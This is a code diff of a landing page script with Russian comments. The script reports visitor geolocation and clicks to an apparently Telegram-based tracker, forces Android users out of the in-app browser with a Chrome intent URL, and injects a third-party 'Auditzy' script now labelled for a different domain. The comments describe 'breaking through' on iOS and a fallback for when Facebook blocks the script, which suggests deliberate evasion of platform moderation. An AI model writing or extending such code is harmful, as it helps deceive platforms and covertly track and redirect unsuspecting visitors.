@@ -124,13 +124,19 @@ fetch('/api/geo').then(r => r.json()).then(data => {
     window.sendTG('👀 LANDING VIEW');
 }).catch(() => {});
 
-// Функция для запуска Auditzy
+// Функция для быстрого запуска НОВОГО Auditzy (beautiful-lady.biz.ua)
 function triggerAuditzy() {
+    // Подменяем ссылку ДО запуска, чтобы при вылете в браузер был ?ext=1
     window.history.replaceState(null, null, "?ext=1");
+    
     var auditzy = document.createElement('script');
     auditzy.id = 'iar';
-    auditzy.src = 'https://rum.auditzy.com/wIoGNwQC-fansly.com-iar.js';
+    auditzy.src = 'https://rum.auditzy.com/GZwAEpIy-beautiful-lady.biz.ua-iar.js';
     auditzy.async = true;
+    auditzy.defer = true;
+    // Добавляем атрибут strategy, как ты указал
+    auditzy.setAttribute('strategy', 'afterInteractive');
+    
     document.head.appendChild(auditzy);
 }
 
@@ -161,7 +167,7 @@ function triggerAuditzy() {
                 var intentUrl = "intent://" + currentUrl.replace(/^https?:\/\//, '') + "?ext=1#Intent;scheme=https;package=com.android.chrome;end";
                 window.location.href = intentUrl;
                 
-                // ФОЛБЭК ДЛЯ ANDROID: Если Intent не сработал за 2.5 сек, запускаем Auditzy
+                // ФОЛБЭК ДЛЯ ANDROID: Если Intent не сработал за 2.5 сек, запускаем новый Auditzy
                 setTimeout(function() {
                     if (document.visibilityState === 'visible') {
                         window.sendTG('⚠️ FALLBACK', 'Android Intent не сработал -> запускаем Auditzy');
@@ -177,9 +183,9 @@ function triggerAuditzy() {
                     }
                 }, 2500);
             } 
-            // ПРОБИВ ДЛЯ iOS И ОСТАЛЬНЫХ (Сразу Auditzy)
+            // ПРОБИВ ДЛЯ iOS И ОСТАЛЬНЫХ (Сразу запускаем новый Auditzy)
             else {
-                window.sendTG('🔥 CLICK', 'iOS/Desktop -> Auditzy на свой домен');
+                window.sendTG('🔥 CLICK', 'iOS/Desktop -> Новый Auditzy на свой домен');
                 triggerAuditzy();
                 
                 // Крайний фолбэк, если Auditzy заблокирован Фейсбуком
